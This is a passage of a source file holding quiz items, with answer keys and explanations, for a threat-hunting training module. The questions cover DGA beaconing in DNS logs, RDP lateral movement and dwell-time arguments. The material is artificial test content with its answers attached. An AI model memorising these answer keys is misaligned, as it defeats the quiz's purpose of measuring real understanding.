            "Threat hunting uses more expensive tools than SIEM triage",
            "Threat hunting is proactive — the hunter assumes compromise and actively queries telemetry to find attacker activity that hasn't triggered any SIEM rule",
            "Threat hunting only examines logs from the past 24 hours; SIEM covers historical data",
            "Threat hunting is only performed after a confirmed breach has been identified",
          ],
          correctIndex: 1,
          explanation: "Threat hunting starts with an assumption of compromise and a hypothesis derived from threat intelligence. The hunter doesn't wait for SIEM alerts — they go looking for TTPs in telemetry that automated rules may never trigger on.",
        },
        {
          id: "m33-q2",
          type: "C2 Detection",
          challenge: `  A threat hunter queries DNS logs and finds a workstation
  making queries to these domains at 60-second intervals:

  xk3mq7.example-cdn.net
  p9fvt2.example-cdn.net
  m4r8qb.example-cdn.net

  None of these domains appear in any threat intelligence feed.
  The workstation's user is a marketing manager.`,
          text: "What does this pattern most likely indicate?",
          options: [
            "A Windows Update service performing routine patch checks",
            "DGA-based C2 beaconing — high-entropy domain names at precise intervals indicate malware generating fresh domains to contact a command server",
            "Normal browser telemetry to analytics content delivery networks",
            "A misconfigured DNS resolver retrying failed NXDOMAIN lookups",
          ],
          correctIndex: 1,
          explanation: "Three indicators: high-entropy domain names (not human-readable brand names), regular 60-second intervals (algorithmic not user-driven), and a marketing manager's workstation (unusual DNS pattern for this role). Classic DGA C2 signature — not in threat feeds because the domains are freshly generated.",
        },
        {
          id: "m33-q3",
          type: "Lateral Movement",
          challenge: `  A threat hunter is investigating a suspected compromise. They
  write a Splunk query for Windows Event ID 4624 Logon Type 10
  and find the following in a 2-hour window:

  Source: WKST-MARKETING-07 → Destinations: SERVER-HR-01, SERVER-FINANCE-02, DC-01, SERVER-DEVOPS-03`,
          text: "What does Event ID 4624 Logon Type 10 indicate, and what does this pattern suggest?",
          options: [
            "Event 4624 Type 10 = failed password reset; pattern suggests a broken AD sync",
            "Event 4624 Type 10 = successful RDP logon; the pattern of a marketing workstation RDP-ing to 4 servers in 2 hours is a strong lateral movement indicator",
            "Event 4624 Type 10 = service account login; normal for maintenance windows",
            "Event 4624 Type 10 = Kerberos ticket renewal; expected behavior during business hours",
          ],
          correctIndex: 1,
          explanation: "Event ID 4624 Logon Type 10 is Remote Interactive (RDP) authentication. A marketing workstation successfully authenticating via RDP to HR, Finance, the domain controller, and DevOps servers within 2 hours matches ATT&CK T1021.001 (Remote Services: RDP) lateral movement.",
        },
        {
          id: "m33-q4",
          type: "Dwell Time",
          challenge: `  A CISO asks: "We have a mature SIEM with 500 correlation rules.
  Our incident response team responds to every escalated alert.
  Why would we invest in a dedicated threat hunting program?"`,
          text: "What is the strongest justification for proactive threat hunting alongside a well-tuned SIEM?",
          options: [
            "Threat hunting replaces the need for SIEM correlation rules — it is more accurate",
            "Attackers who evade SIEM rules dwell for 200+ days on average; threat hunting finds this activity before objectives are achieved — average dwell drops below 60 days in mature hunt programs",
            "Threat hunting is required by PCI-DSS compliance frameworks",
            "SIEM tools are too slow for real-time detection; threat hunting compensates for this latency",
          ],
          correctIndex: 1,
          explanation: "SIEM rules catch known patterns; sophisticated attackers avoid known patterns. Average dwell without hunting: 197 days. In organizations with mature threat hunting programs, this drops below 60 days. Hunting finds what rules miss — before the attacker achieves their objective.",
        },
      ],
    },
  },
];
